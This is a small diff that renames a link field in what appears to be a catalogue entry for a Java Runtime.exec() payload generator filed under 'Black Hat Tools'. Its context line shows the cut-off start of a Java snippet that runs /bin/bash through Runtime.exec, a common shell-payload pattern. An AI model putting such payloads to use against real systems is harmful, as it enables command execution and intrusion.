@@ -7,6 +7,6 @@ Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{\"/bin/bash\",\
 java.lang.Runtime.exec() payload generator: 
 
 "
-url: "http://www.jackson-t.ca/runtime-exec-payloads.html"
+external_url: "http://www.jackson-t.ca/runtime-exec-payloads.html"
 category: "Black Hat Tools"
 ---
